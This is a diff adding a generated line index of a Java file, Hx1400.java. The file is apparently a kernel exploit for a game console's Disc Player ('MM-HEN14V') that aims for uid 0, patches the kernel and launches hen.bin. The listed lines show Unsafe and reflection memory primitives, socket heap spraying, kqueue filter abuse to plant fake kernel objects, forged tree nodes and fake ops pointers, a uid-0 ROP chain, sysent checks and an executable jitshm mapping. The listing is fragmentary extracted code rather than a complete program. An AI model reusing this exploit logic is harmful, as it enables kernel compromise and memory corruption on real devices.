@@ -1,0 +1,1185 @@
+======================================================================
+  Hx1400.java — Method declarations
+======================================================================
+  188  static String tableFault() {
+  204  static void tableApply() {
+  243  private native long nativeCall(long var1, int[] var3);
+  245  public static String LOGS() {
+  258  static String hz(long l) {
+  262  static String h16(long l) {
+  270  static long sx(long l) {
+  281  static boolean kptr(long l) {
+  285  public void run() {
+  292  public String probe() {
+ 1475  static int hexv(char c) {
+
+======================================================================
+  Hx1400.java — Native methods (JNI)
+======================================================================
+  243  private native long nativeCall(long var1, int[] var3);
+
+======================================================================
+  Hx1400.java — Unsafe / reflection primitives
+======================================================================
+    9  import sun.misc.Unsafe;
+  251  return (Long)method.invoke(object, string);
+  340  Field field = Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
+  341  field.setAccessible(true);
+  342  Unsafe unsafe = (Unsafe)field.get(null);
+  343  long l20 = unsafe.getLong(new Object[]{DM}, 24L);
+  344  rAK = unsafe.getLong(l20 + 8L);
+  345  Class<?> clazz = Class.forName("java.lang.ClassLoader$NativeLibrary");
+  346  Method method = clazz.getDeclaredMethod("find", Class.forName("java.lang.String"));
+  347  method.setAccessible(true);
+  348  Field field2 = clazz.getDeclaredField("handle");
+  349  field2.setAccessible(true);
+  350  Constructor<?> constructor = clazz.getDeclaredConstructors()[0];
+  351  constructor.setAccessible(true);
+  352  Object obj = constructor.newInstance(Class.forName("Hx1400"), "x", new Boolean(true));
+  380  long l29 = unsafe.getLong(new Object[]{this}, 24L);
+  381  long l30 = unsafe.getLong(l29 + 8L);
+  382  long l31 = unsafe.getLong(l30 + 200L);
+  383  int n21 = unsafe.getInt(l31 + 16L);
+  386  l19 = unsafe.getLong(l31 + 24L + (long)n20 * 8L);
+  388  long l32 = unsafe.getLong(l19 + 16L);
+  389  l18 = unsafe.getLong(l19 + 24L);
+  390  if (l32 == 0L || l18 == 0L || (l17 = unsafe.getLong(l18 + 64L + (long)unsafe.getShort(l32 + 66L) * 8L) & 0xFFFFFFFFFFFFFFFEL) == 0L || unsafe.getShort(l17 + 8L) != 5) continue;
+  393  if (unsafe.getByte(l17 + 10L + (long)i) == byArray[i]) continue;
+  398  unsafe.putInt(l19 + 44L, unsafe.getInt(l19 + 44L) | 0x6000000);
+  405  l18 = unsafe.getLong(l31 + 24L + (long)i * 8L);
+  407  l17 = unsafe.getLong(l18 + 16L);
+  408  long l34 = unsafe.getLong(l18 + 24L);
+  409  if (l17 == 0L || l34 == 0L || (l33 = unsafe.getLong(l34 + 64L + (long)unsafe.getShort(l17 + 66L) * 8L) & 0xFFFFFFFFFFFFFFFEL) == 0L || (unsafe.getShort(l33 + 8L) & 0xFFFF) != 10) continue;
+  412  if (unsafe.getByte(l33 + 10L + (long)j) == byArray2[j]) continue;
+  416  if (!bl3 || unsafe.getByte(l33 + 10L + 10L) != 0 || n20 != 0) continue;
+  417  l19 = unsafe.getLong(l18 + 120L);
+  421  unsafe.putInt(l18 + 44L, unsafe.getInt(l18 + 44L) | 0x6000000);
+  427  long l35 = unsafe.allocateMemory(2048L);
+  428  unsafe.setMemory(l35, 2048L, (byte)0);
+  433  unsafe.putLong(l36, l37);
+  434  unsafe.putLong(l37 + 104L, l38);
+  435  unsafe.putLong(l39 + 128L, l28);
+  436  unsafe.putLong(l39 + 240L, l28);
+  437  unsafe.putLong(l38 + 16L, l39);
+  438  unsafe.putLong(l38 + 32L, l39);
+  439  unsafe.putLong(l38 + 184L, 0L);
+  440  unsafe.putLong(l39 + 560L, l21 + 35L);
+  441  unsafe.putLong(pM + 120L, pF);
+  443  unsafe.putLong(pM + 120L, l19);
+  445  long l41 = unsafe.getLong(l40 + 8L);
+  449  unsafe.putLong(l40 + 8L, rAK);
+  450  unsafe.putLong(l40 + 24L, 0L);
+  460  this.pid = this.ac(unsafe, l23, 0L, 0L, 0L, 0L, 0L, 0L);
+  465  this.logB = unsafe.allocateMemory(256L);
+  466  this.logA = unsafe.allocateMemory(16L);
+  467  unsafe.setMemory(this.logA, 16L, (byte)0);
+  468  unsafe.putByte(this.logA, (byte)16);
+  469  unsafe.putByte(this.logA + 1L, (byte)2);
+  470  unsafe.putByte(this.logA + 2L, (byte)35);
+  471  unsafe.putByte(this.logA + 3L, (byte)65);
+  472  unsafe.putByte(this.logA + 4L, (byte)-64);
+  473  unsafe.putByte(this.logA + 5L, (byte)-88);
+  474  unsafe.putByte(this.logA + 6L, (byte)8);
+  475  unsafe.putByte(this.logA + 7L, (byte)81);
+  476  this.udpS = this.ac(unsafe, l24, 2L, 2L, 0L, 0L, 0L, 0L);
+  477  this.lg(unsafe, "=== MM-HEN14V : uid=0, patch the kernel, then load and launch hen.bin. pid=" + this.pid + " ===");
+  484  if (lArray[i] != 0L || !this.chk(unsafe, l16, nArray[i])) continue;
+  492  if (!this.chk(unsafe, l15, 20)) continue;
+  496  this.lg(unsafe, "stubs " + n22 + "/" + nArray.length + " control=" + (l16 == l23 ? "AGREE" : "DISAGREE"));
+  498  return this.fin(unsafe, "stubs " + n22 + "/" + nArray.length);
+  521  if (!this.chk(unsafe, l14, 533)) continue;
+  527  if (!this.chk(unsafe, l13, 136)) continue;
+  536  if (l13 == 0L && this.chk(unsafe, l12, 104)) {
+  539  if (l61 == 0L && this.chk(unsafe, l12, 106)) {
+  542  if (l62 == 0L && this.chk(unsafe, l12, 30)) {
+  545  if (l63 != 0L || !this.chk(unsafe, l12, 92)) continue;
+  552  l12 = unsafe.allocateMemory(32L);
+  553  long l64 = unsafe.allocateMemory(16L);
+  554  long l65 = unsafe.allocateMemory(32768L);
+  555  long l66 = unsafe.allocateMemory(200L);
+  556  long l67 = unsafe.allocateMemory(20L);
+  557  long l68 = unsafe.allocateMemory(20L);
+  558  long l69 = unsafe.allocateMemory(20L);
+  559  long l70 = unsafe.allocateMemory(20L);
+  560  long l71 = unsafe.allocateMemory(16L);
+  561  long l72 = unsafe.allocateMemory(16L);
+  562  long l73 = unsafe.allocateMemory(16L);
+  563  long l74 = unsafe.allocateMemory(512L);
+  564  long l75 = unsafe.allocateMemory(512L);
+  565  long l76 = unsafe.allocateMemory(8L);
+  566  long l77 = unsafe.allocateMemory(64L);
+  567  long l78 = unsafe.allocateMemory(32L);
+  568  long l79 = unsafe.allocateMemory(16L);
+  569  long l80 = unsafe.allocateMemory(16L);
+  570  long l81 = unsafe.allocateMemory(16L);
+  571  unsafe.setMemory(l12, 32L, (byte)0);
+  572  unsafe.setMemory(l64, 16L, (byte)0);
+  573  unsafe.setMemory(l65, 32768L, (byte)0);
+  574  unsafe.setMemory(l66, 200L, (byte)0);
+  575  unsafe.setMemory(l71, 16L, (byte)0);
+  576  unsafe.setMemory(l72, 16L, (byte)0);
+  577  unsafe.setMemory(l73, 16L, (byte)0);
+  580  unsafe.setMemory(l74, 512L, (byte)0);
+  581  unsafe.setMemory(l78, 32L, (byte)0);
+  582  unsafe.setMemory(l79, 16L, (byte)0);
+  583  unsafe.setMemory(l80, 16L, (byte)0);
+  584  unsafe.setMemory(l81, 16L, (byte)0);
+  587  unsafe.putInt(l12 + (long)n19 * 4L, nArray3[n19]);
+  590  unsafe.putInt(l66 + (long)(n19 * 40) + 8L, 0);
+  591  unsafe.putInt(l66 + (long)(n19 * 40) + 32L, -1);
+  595  unsafe.putByte(l78 + (long)n18, byArray3[n18]);
+  597  unsafe.putByte(l74 + 1L, (byte)30);
+  598  unsafe.putByte(l74 + 3L, (byte)15);
+  601  unsafe.putInt(l74 + (long)n18, 0x43434343);
+  602  unsafe.putInt(l74 + (long)n18 + 4L, 0x54545454);
+  605  unsafe.putByte(l79, (byte)-17);
+  606  unsafe.putByte(l79 + 1L, (byte)-1);
+  607  unsafe.putByte(l79 + 2L, (byte)-1);
+  608  unsafe.putByte(l79 + 3L, (byte)-6);
+  609  unsafe.putByte(l80, (byte)-17);
+  610  unsafe.putByte(l80 + 1L, (byte)-1);
+  611  unsafe.putByte(l80 + 2L, (byte)-1);
+  612  unsafe.putByte(l80 + 3L, (byte)-7);
+  613  unsafe.putByte(l81, (byte)-17);
+  614  unsafe.putByte(l81 + 1L, (byte)-1);
+  615  unsafe.putByte(l81 + 2L, (byte)-1);
+  616  unsafe.putByte(l81 + 3L, (byte)-7);
+  617  unsafe.putByte(l81 + 4L, (byte)-64);
+  618  unsafe.putByte(l81 + 5L, (byte)0);
+  619  unsafe.putByte(l81 + 6L, (byte)2);
+  620  unsafe.putByte(l81 + 7L, (byte)1);
+  621  long l82 = unsafe.allocateMemory(1024L);
+  622  long l83 = unsafe.allocateMemory(8L);
+  626  if (Hx1400.sx(this.ac(unsafe, l47, i, 0L, 13L, l80, 8L, 0L)) == 0L) {
+  627  this.ac(unsafe, l47, i, 0L, 13L, l79, 8L, 0L);
+  628  if (Hx1400.sx(this.ac(unsafe, l44, i, 0L, 0L, 0L, 0L, 0L)) != 0L) continue;
+  632  unsafe.putInt(l83, 1024);
+  633  if (Hx1400.sx(this.ac(unsafe, l48, i, 41L, 51L, l82, l83, 0L)) != 0L || unsafe.getInt(l83) != 248 || Hx1400.sx(this.ac(unsafe, l44, i, 0L, 0L, 0L, 0L, 0L)) != 0L) continue;
+  636  this.lg(unsafe, "R reclaimed " + n23 + " leaked victims + " + n24 + " leaked spray sockets from earlier runs");
+  637  long l84 = Hx1400.sx(this.ac(unsafe, l46, 2L, 2L, 0L, 0L, 0L, 0L));
+  639  this.ac(unsafe, l44, l84, 0L, 0L, 0L, 0L, 0L);
+  641  this.lg(unsafe, "R lowest free fd after reclaim = " + l84 + " (need ~250 below the ~291 ceiling)");
+  643  this.lg(unsafe, "R \u26a0 still high - if the run stops at `victims N/96`, restart the Disc Player once");
+  646  unsafe.putLong(l64, 0L);
+  647  if (Hx1400.sx(this.ac(unsafe, l49, l12, 6L, 0L, l64, 0L, 0L)) != 0L) {
+  648  return this.fin(unsafe, "route closed");
+  650  long l86 = Hx1400.sx(this.ac(unsafe, l53, 3L, 1L, l85, 16L, l71, 0L));
+  653  if ((unsafe.getByte(l71 + (long)(n17 >>> 3)) & 1 << (n17 & 7)) == 0) continue;
+  658  return this.fin(unsafe, "affinity");
+  660  unsafe.putByte(l72 + (long)(n25 >>> 3), (byte)(1 << (n25 & 7)));
+  661  this.ac(unsafe, l54, 3L, 1L, l85, 16L, l72, 0L);
+  662  unsafe.setMemory(l73, 16L, (byte)0);
+  663  this.ac(unsafe, l53, 3L, 1L, l85, 16L, l73, 0L);
+  664  if (!this.meq(unsafe, l72, l73)) {
+  665  return this.fin(unsafe, "pin readback");
+  667  this.lg(unsafe, "A pinned core=" + n25);
+  669  unsafe.putLong(l64, 32768L);
+  670  if (this.wash(unsafe, l55, l56, l57, l58, l66, l67, l68, l69, l70, 32) != 32) {
+  671  this.ac(unsafe, l54, 3L, 1L, l85, 16L, l71, 0L);
+  672  return this.fin(unsafe, "wash stalled " + this.failStr());
+  674  this.ac(unsafe, l49, l12, 6L, l65, l64, 0L, 0L);
+  675  this.parse(unsafe, l65, unsafe.getLong(l64));
+  677  this.lg(unsafe, "A seg " + (n17 + 1) + "/" + 12 + " (" + (n17 + 1) * 32 + " cycles) no anchor yet");
+  680  this.lg(unsafe, "A segments=" + n17 + " cycles=" + n17 * 32);
+  681  this.ac(unsafe, l54, 3L, 1L, l85, 16L, l71, 0L);
+  682  this.lg(unsafe, "A KBASE=" + (this.kbase != 0L ? Hx1400.h16(this.kbase) : "none") + " washStuck=" + this.wStuck);
+  684  return this.fin(unsafe, "no kbase");
+  686  unsafe.setMemory(l73, 16L, (byte)0);
+  687  this.ac(unsafe, l54, 3L, 1L, l85, 16L, l72, 0L);
+  688  this.ac(unsafe, l53, 3L, 1L, l85, 16L, l73, 0L);
+  689  if (!this.meq(unsafe, l72, l73)) {
+  690  return this.fin(unsafe, "re-pin");
+  692  int n26 = (int)Hx1400.sx(this.ac(unsafe, l46, 2L, 2L, 0L, 0L, 0L, 0L));
+  696  for (int i = 0; i < 96 && (l11 = Hx1400.sx(this.ac(unsafe, l46, 2L, 2L, 0L, 0L, 0L, 0L))) > l87; ++i) {
+  703  this.lg(unsafe, "B0 anchor=" + n26 + " victims=" + n27 + "/" + 96 + " highest=" + l87);
+  705  return this.fin(unsafe, "victims " + n27);
+  707  long l88 = unsafe.allocateMemory(256L);
+  708  long l89 = Hx1400.sx(this.ac(unsafe, l43, l78, 2L, 0L, 0L, 0L, 0L));
+  713  unsafe.setMemory(l88, 256L, (byte)0);
+  714  if (Hx1400.sx(this.ac(unsafe, l59, l89, l88, 0L, 0L, 0L, 0L)) == 0L) {
+  715  l92 = (long)unsafe.getInt(l88 + 0L) & 0xFFFFFFFFL;
+  716  l91 = (long)unsafe.getInt(l88 + 4L) & 0xFFFFFFFFL;
+  717  l90 = (long)unsafe.getInt(l88 + 20L) & 0xFFFFFFFFL;
+  720  this.lg(unsafe, "B1 our dce fd=" + l89 + " dev=" + Hx1400.hz(l92) + " ino=" + Hx1400.hz(l91) + " rdev=" + Hx1400.hz(l90));
+  722  return this.fin(unsafe, "our own /dev/dce has no usable st_ino - refusing to guess");
+  731  unsafe.setMemory(l88, 256L, (byte)0);
+  732  if (Hx1400.sx(this.ac(unsafe, l59, i, l88, 0L, 0L, 0L, 0L)) != 0L) continue;
+  733  n16 = unsafe.getShort(l88 + 8L) & 0xFFFF;
+  734  long l93 = (long)unsafe.getInt(l88 + 0L) & 0xFFFFFFFFL;
+  735  long l94 = (long)unsafe.getInt(l88 + 4L) & 0xFFFFFFFFL;
+  736  long l95 = (long)unsafe.getInt(l88 + 20L) & 0xFFFFFFFFL;
+  743  this.lg(unsafe, stringBuffer.toString());
+  744  this.lg(unsafe, "B1 fds whose st_ino == our dce's = " + n28 + "  (* marks a real match)");
+  749  this.lg(unsafe, stringBuffer2.toString());
+  751  this.ac(unsafe, l44, l89, 0L, 0L, 0L, 0L, 0L);
+  755  if (Hx1400.sx(this.ac(unsafe, l44, nArray5[n15], 0L, 0L, 0L, 0L, 0L)) != 0L) continue;
+  758  this.lg(unsafe, "B1 closed " + n16 + "/" + n28 + " dce fds (matched by inode, not by rdev)");
+  763  l10 = this.cstr(unsafe, stringArray[n14]);
+  764  long l97 = Hx1400.sx(this.ac(unsafe, l43, l10, 2L, 0L, 0L, 0L, 0L));
+  766  this.ac(unsafe, l44, l97, 0L, 0L, 0L, 0L, 0L);
+  768  this.lg(unsafe, "B1 plug device = " + stringArray[n14]);
+  772  l10 = Hx1400.sx(this.ac(unsafe, l43, l96, 2L, 0L, 0L, 0L, 0L));
+  778  this.lg(unsafe, "B1 plugged " + n15 + "/" + n28 + " of the app's own fd numbers with an inert device");
+  780  this.lg(unsafe, "B1 no plug device available - the app's fd numbers WILL be reused by the spray");
+  782  long l98 = Hx1400.sx(this.ac(unsafe, l43, l78, 2L, 0L, 0L, 0L, 0L));
+  783  long l99 = l98 >= 0L ? Hx1400.sx(this.ac(unsafe, l44, l98, 0L, 0L, 0L, 0L, 0L)) : -1L;
+  785  this.lg(unsafe, "B1 warm dce open=" + l98 + " close=" + l99);
+  789  for (n13 = 0; n13 < 144 && (l9 = Hx1400.sx(this.ac(unsafe, l46, 28L, 2L, 0L, 0L, 0L, 0L))) > l100; ++n13) {
+  794  this.ac(unsafe, l47, nArray7[n13], 41L, 51L, l74, 248L, 0L);
+  798  this.lg(unsafe, "B spray n=" + n30 + " highest=" + l100);
+  800  return this.fin(unsafe, "spray n=" + n30);
+  802  this.cKq = l8 = Hx1400.sx(this.ac(unsafe, l51, 0L, 0L, 0L, 0L, 0L, 0L));
+  804  return this.fin(unsafe, "kqueue");
+  817  this.ac(unsafe, l47, nArray7[n37], 41L, 51L, 0L, 0L, 0L);
+  820  this.ac(unsafe, l47, nArray7[n37], 41L, 51L, l74, 248L, 0L);
+  822  this.lg(unsafe, "C round " + n12 + "/" + 6 + " re-packed, sweeping " + CANDS.length + " candidates");
+  825  if (n38 >= n30 || !this.marked(unsafe, l48, nArray7[n38], l75, l76) || Hx1400.sx(this.ac(unsafe, l47, nArray7[n38], 41L, 51L, 0L, 0L, 0L)) != 0L) continue;
+  826  long l103 = Hx1400.sx(this.ac(unsafe, l43, l78, 2L, 0L, 0L, 0L, 0L));
+  828  this.ac(unsafe, l47, nArray7[n38], 41L, 51L, l74, 248L, 0L);
+  833  unsafe.setMemory(l77, 64L, (byte)0);
+  834  unsafe.putInt(l77, (int)l103);
+  835  unsafe.putShort(l77 + 8L, (short)-18);
+  836  unsafe.putShort(l77 + 10L, (short)1);
+  837  unsafe.putInt(l77 + 16L, 90);
+  838  long l105 = Hx1400.sx(this.ac(unsafe, l52, l8, l77, 1L, 0L, 0L, 0L));
+  844  unsafe.setMemory(l75, 512L, (byte)0);
+  845  unsafe.putInt(l76, 248);
+  846  if (Hx1400.sx(this.ac(unsafe, l48, nArray7[i], 41L, 51L, l75, l76, 0L)) != 0L) continue;
+  847  if (unsafe.getInt(l75 + 8L) == n39 && unsafe.getInt(l75 + 12L) == 0) {
+  854  if (unsafe.getInt(l75 + 8L) == 0x43434343 && unsafe.getInt(l75 + 12L) == 0x54545454) continue;
+  855  this.ac(unsafe, l47, nArray7[i], 41L, 51L, l74, 248L, 0L);
+  859  unsafe.setMemory(l77, 64L, (byte)0);
+  860  unsafe.putInt(l77, (int)l103);
+  861  unsafe.putShort(l77 + 8L, (short)-18);
+  862  unsafe.putShort(l77 + 10L, (short)2);
+  863  if (Hx1400.sx(this.ac(unsafe, l52, l8, l77, 1L, 0L, 0L, 0L)) != 0L) {
+  867  this.ac(unsafe, l47, nArray7[n38], 41L, 51L, l74, 248L, 0L);
+  874  this.lg(unsafe, "C HELD round=" + n12 + " try=" + n35 + " cand=" + n38 + " dce=" + l103 + " target=" + n32 + " val=" + Hx1400.hz(l104));
+  875  this.lg(unsafe, "C \u26a0 " + n36 + " arms MISSED - each one wrote 8 bytes into an unknown zone-256 kernel object and cannot be repaired. Cold reboot clears them.");
+  881  unsafe.setMemory(l77, 64L, (byte)0);
+  882  unsafe.putInt(l77, (int)l103);
+  883  unsafe.putShort(l77 + 8L, (short)-18);
+  884  unsafe.putShort(l77 + 10L, (short)2);
+  885  this.ac(unsafe, l52, l8, l77, 1L, 0L, 0L, 0L);
+  887  this.ac(unsafe, l44, l103, 0L, 0L, 0L, 0L, 0L);
+  888  this.ac(unsafe, l47, nArray7[n38], 41L, 51L, l74, 248L, 0L);
+  892  this.ac(unsafe, l44, l8, 0L, 0L, 0L, 0L, 0L);
+  894  this.ac(unsafe, l44, nArray7[n12], 0L, 0L, 0L, 0L, 0L);
+  896  this.ac(unsafe, l54, 3L, 1L, l85, 16L, l71, 0L);
+  897  return this.fin(unsafe, "no pair after " + n35 + " arms (cap " + 32 + "), " + n36 + " blind writes left in the kernel, kbase=" + Hx1400.h16(this.kbase));
+  901  long l108 = this.ac(unsafe, l50, l107, 16384L, 3L, 4114L, -1L, 0L);
+  902  this.lg(unsafe, "D fake=" + Hx1400.hz(l106) + " page=" + Hx1400.hz(l107) + " mmap=" + Hx1400.hz(l108));
+  904  return this.fin(unsafe, "mmap fixed " + Hx1400.hz(l108));
+  907  unsafe.setMemory(l107, 16384L, (byte)0);
+  908  this.lg(unsafe, "D reusing anchor=" + n26 + " and " + n27 + " victims opened before the spray");
+  909  if (Hx1400.sx(this.ac(unsafe, l47, n26, 0L, 12L, l79, 8L, 0L)) != 0L || Hx1400.sx(this.ac(unsafe, l47, n26, 0L, 12L, l80, 8L, 0L)) != 0L) {
+  910  return this.fin(unsafe, "anchor join");
+  912  if (Hx1400.sx(this.ac(unsafe, l47, n33, 41L, 51L, 0L, 0L, 0L)) != 0L) {
+  913  return this.fin(unsafe, "target free");
+  916  for (n10 = 0; n10 < n27 && Hx1400.sx(this.ac(unsafe, l47, nArray4[n10], 0L, 12L, l79, 8L, 0L)) == 0L && Hx1400.sx(this.ac(unsafe, l47, nArray4[n10], 0L, 12L, l80, 8L, 0L)) == 0L; ++n10) {
+  919  this.lg(unsafe, "D joined=" + n40);
+  921  return this.fin(unsafe, "joined " + n40);
+  923  unsafe.putByte(l106 + 16L, (byte)-17);
+  924  unsafe.putByte(l106 + 17L, (byte)-1);
+  925  unsafe.putByte(l106 + 18L, (byte)-1);
+  926  unsafe.putByte(l106 + 19L, (byte)-7);
+  927  unsafe.putLong(l106 + 24L, l106 + 512L);
+  928  unsafe.putInt(l106 + 640L, 8);
+  929  unsafe.putLong(l106 + 32L, l106 + 768L);
+  930  unsafe.putLong(l106 + 800L, l106 + 1024L);
+  931  unsafe.putLong(l106 + 1880L, l106 + 2048L);
+  932  unsafe.putLong(l106 + 2056L, l106 + 2304L);
+  933  unsafe.putInt(l106 + 56L, 2);
+  934  unsafe.putLong(l106 + 80L, 0L);
+  935  unsafe.putLong(l106 + 88L, 0L);
+  936  unsafe.putShort(l106 + 180L, (short)2);
+  937  unsafe.putShort(l106 + 190L, (short)2);
+  938  unsafe.setMemory(l77, 64L, (byte)0);
+  939  unsafe.putInt(l77, (int)l101);
+  940  unsafe.putShort(l77 + 8L, (short)-18);
+  941  unsafe.putShort(l77 + 10L, (short)1);
+  942  unsafe.putInt(l77 + 16L, 0);
+  948  this.lg(unsafe, "D \u26d4 armed from here: " + Hx1400.hz(l106) + " is about to enter a membership vector");
+  949  this.lg(unsafe, "D arming filter -18 data=0 -> plants " + Hx1400.hz(l106) + " in the membership vector");
+  950  if (Hx1400.sx(this.ac(unsafe, l52, l8, l77, 1L, 0L, 0L, 0L)) != 0L) {
+  951  return this.fin(unsafe, "leak ev-add");
+  956  this.ac(unsafe, l47, nArray4[n11], 0L, 72L, l81, 12L, 0L);
+  957  long l110 = unsafe.getLong(l106 + 80L);
+  958  if (unsafe.getInt(l106 + 56L) != 2) {
+  959  this.lg(unsafe, "D ref mutated at " + n11);
+  968  this.lg(unsafe, "D noncanonical tree at " + n11 + " = " + Hx1400.h16(l110));
+  971  this.lg(unsafe, "D victim=" + n10 + " KVA=" + (l109 != 0L ? Hx1400.h16(l109) : "none") + " count=" + unsafe.getLong(l106 + 88L));
+  973  return this.fin(unsafe, "no kva");
+  980  unsafe.setMemory(l111, 48L, (byte)0);
+  981  unsafe.setMemory(l112, 48L, (byte)0);
+  982  unsafe.setMemory(l113, 48L, (byte)0);
+  983  this.node(unsafe, l111, l112, 0L, 0L, 0, -1L);
+  984  this.node(unsafe, l112, 0L, l113, l111, 1, -2L);
+  985  this.node(unsafe, l113, 0L, 0L, l112, 0, -3L);
+  986  unsafe.putLong(l106 + 80L, l111);
+  987  unsafe.putLong(l106 + 88L, 3L);
+  988  unsafe.putByte(l81 + 7L, (byte)2);
+  989  long l115 = Hx1400.sx(this.ac(unsafe, l47, n11, 0L, 72L, l81, 12L, 0L));
+  990  boolean bl6 = l115 == 0L && unsafe.getLong(l114) == l111 && unsafe.getLong(l106 + 80L) == l112 && Hx1400.kptr(unsafe.getLong(l112));
+  991  this.lg(unsafe, "E gadget rc=" + l115 + " T=" + Hx1400.h16(unsafe.getLong(l114)) + " want=" + Hx1400.h16(l111) + " root=" + Hx1400.h16(unsafe.getLong(l106 + 80L)) + " ok=" + bl6);
+  993  return this.fin(unsafe, "rb gadget");
+ 1001  unsafe.setMemory(l111, 48L, (byte)0);
+ 1002  unsafe.setMemory(l112, 48L, (byte)0);
+ 1003  unsafe.setMemory(l113, 48L, (byte)0);
+ 1004  this.node(unsafe, l111, l112, l113, l118, 0, -1L);
+ 1005  this.node(unsafe, l112, 0L, 0L, l111, 1, -2L);
+ 1006  this.node(unsafe, l113, 0L, 0L, 0L, 0, -3L);
+ 1007  unsafe.putLong(l106 + 80L, l111);
+ 1008  unsafe.putLong(l106 + 88L, 3L);
+ 1009  unsafe.putByte(l81 + 7L, (byte)3);
+ 1010  this.lg(unsafe, "F rotating fake ops into slot " + Hx1400.h16(l116));
+ 1011  long l119 = Hx1400.sx(this.ac(unsafe, l47, n11, 0L, 72L, l81, 12L, 0L));
+ 1012  boolean bl7 = l119 == 0L && unsafe.getLong(l106 + 80L) == l111 && unsafe.getLong(l106 + 88L) == 4L && unsafe.getLong(l111) == 0L && unsafe.getLong(l111 + 8L) == l113 && unsafe.getLong(l111 + 16L) == l112 && unsafe.getLong(l112 + 8L) == l111 && unsafe.getLong(l113 + 16L) == 0L && Hx1400.kptr(unsafe.getLong(l112));
+ 1013  this.lg(unsafe, "F rotate rc=" + l119 + " root=" + Hx1400.h16(unsafe.getLong(l106 + 80L)) + " Gparent=" + Hx1400.h16(unsafe.getLong(l111 + 16L)) + " ok=" + bl7);
+ 1015  return this.fin(unsafe, "rotation gate");
+ 1017  unsafe.putLong(l112, 0L);
+ 1018  unsafe.putLong(l112 + 8L, this.ka(R_RET0));
+ 1019  unsafe.putLong(l112 + 16L, this.ka(R_RET0));
+ 1020  unsafe.putLong(l112 + 24L, this.ka(R_RET0));
+ 1021  unsafe.putLong(l112 + 32L, this.ka(R_TOUCH));
+ 1022  if (unsafe.getInt(l112) != 0 || unsafe.getLong(l112 + 8L) != this.ka(R_RET0) || unsafe.getLong(l112 + 32L) != this.ka(R_TOUCH)) {
+ 1023  return this.fin(unsafe, "fakeOps readback");
+ 1025  this.lg(unsafe, "F fakeOps isfd=0 attach=" + Hx1400.h16(unsafe.getLong(l112 + 8L)) + " touch=" + Hx1400.h16(unsafe.getLong(l112 + 32L)));
+ 1035  if (!this.chk(unsafe, l6, 24)) continue;
+ 1039  if ((l6 = Hx1400.sx(this.ac(unsafe, l51, 0L, 0L, 0L, 0L, 0L, 0L))) < 0L) {
+ 1040  return this.fin(unsafe, "root kqueue");
+ 1042  unsafe.setMemory(l77, 64L, (byte)0);
+ 1043  unsafe.putLong(l77, this.gIDENT);
+ 1044  unsafe.putShort(l77 + 8L, (short)-23);
+ 1045  unsafe.putShort(l77 + 10L, (short)1);
+ 1046  if (Hx1400.sx(this.ac(unsafe, l52, l6, l77, 1L, 0L, 0L, 0L)) != 0L) {
+ 1047  return this.fin(unsafe, "initial EV_ADD -23");
+ 1058  this.lg(unsafe, "F knote armed on kq=" + l6 + "; the slot STAYS hooked -> ring 0 is re-enterable");
+ 1059  this.lg(unsafe, "F \u26d4 from here on, ANY exit goes through safeDown() - never a bare munmap");
+ 1060  int n41 = this.kb0(unsafe);
+ 1061  n41 = this.w8(unsafe, l120, n41, this.ka(R_UCRED));
+ 1062  n41 = this.w8(unsafe, l120, n41, 0L);
+ 1063  n41 = this.w8(unsafe, l120, n41, this.ka(R_PRAX));
+ 1064  n41 = this.w8(unsafe, l120, n41, 0x100000000L);
+ 1065  n41 = this.w8(unsafe, l120, n41, this.ka(R_PRDX));
+ 1066  n41 = this.w8(unsafe, l120, n41, 0L);
+ 1067  n41 = this.w8(unsafe, l120, n41, this.ka(R_UIDPAIR));
+ 1068  n41 = this.w8(unsafe, l120, n41, 0L);
+ 1069  n41 = this.uq(unsafe, l120, n41, 88L, 5188428245707522067L);
+ 1070  n41 = this.uq(unsafe, l120, n41, 96L, -1L);
+ 1071  n41 = this.uq(unsafe, l120, n41, 104L, -1L);
+ 1072  n41 = this.kb1(unsafe, n41);
+ 1073  this.lg(unsafe, "F entry1 uid0 = " + n41 + " qwords at " + Hx1400.hz(l120) + " ctx=" + Hx1400.hz(l121));
+ 1074  boolean bl8 = this.kgo(unsafe, l52, l77, l6, n41);
+ 1075  long l123 = l122 != 0L ? Hx1400.sx(this.ac(unsafe, l122, 0L, 0L, 0L, 0L, 0L, 0L)) : -1L;
+ 1076  this.lg(unsafe, "F entry1 mark=" + bl8 + "  *** uid=" + l123 + " ***");
+ 1078  return this.fin(unsafe, "entry1 mark=" + bl8 + " uid=" + l123);
+ 1086  n8 = (int)this.kbytes(unsafe, l52, l77, l6, this.ka(GRVA[n9]), GLEN[n9]);
+ 1100  this.lg(unsafe, "H guards: stock=" + n42 + " patched=" + n43 + " odd=" + (GRVA.length - n42 - n43) + " of " + GRVA.length);
+ 1102  this.lg(unsafe, stringBuffer3.toString());
+ 1107  return this.fin(unsafe, "MIXED kernel: stock=" + n42 + " patched=" + n43 + " first odd +0x" + Long.toHexString(GRVA[n44 < 0 ? 0 : n44]) + "=0x" + Long.toHexString(l124) + " - refusing to fire, cold reboot first");
+ 1109  this.lg(unsafe, n8 != 0 ? "H *** kernel is ALREADY FULLY PATCHED - skipping 1400.bin ***" : "H *** kernel is stock - 1400.bin will be applied ***");
+ 1113  long l126 = this.kread(unsafe, l52, l77, l6, this.ka(SE11));
+ 1114  this.lg(unsafe, "H sysent[11].sy_call before=" + Hx1400.h16(l126) + " (unpatched kernel: sys_nosys)");
+ 1119  return this.fin(unsafe, "syscall 533 (jitshm) not resolvable - no executable page");
+ 1121  l5 = Hx1400.sx(this.ac(unsafe, l60, 0L, 16384L, 7L, 0L, 0L, 0L));
+ 1122  this.lg(unsafe, "I jitshm fd=" + l5);
+ 1124  return this.fin(unsafe, "jitshm create rc=" + l5);
+ 1126  l4 = this.ac(unsafe, l50, 0x940900000L, 16384L, 7L, 17L, l5, 0L);
+ 1128  l4 = this.ac(unsafe, l50, 0L, 16384L, 7L, 1L, l5, 0L);
+ 1129  this.lg(unsafe, "I fixed map refused, floating map=" + Hx1400.hz(l4));
+ 1132  return this.fin(unsafe, "jitshm mmap failed");
+ 1137  unsafe.putByte(l4 + (long)n7, (byte)(n48 << 4 | n47));
+ 1139  n7 = unsafe.getByte(l4) & 0xFF;
+ 1140  n48 = unsafe.getByte(l4 + 1L) & 0xFF;
+ 1141  n47 = unsafe.getByte(l4 + 631L) & 0xFF;
+ 1142  this.lg(unsafe, "I blob at " + Hx1400.hz(l4) + " head=" + Integer.toHexString(n7) + " " + Integer.toHexString(n48) + " tail=" + Integer.toHexString(n47) + " (want b9 82 ... c3)");
+ 1144  return this.fin(unsafe, "blob readback");
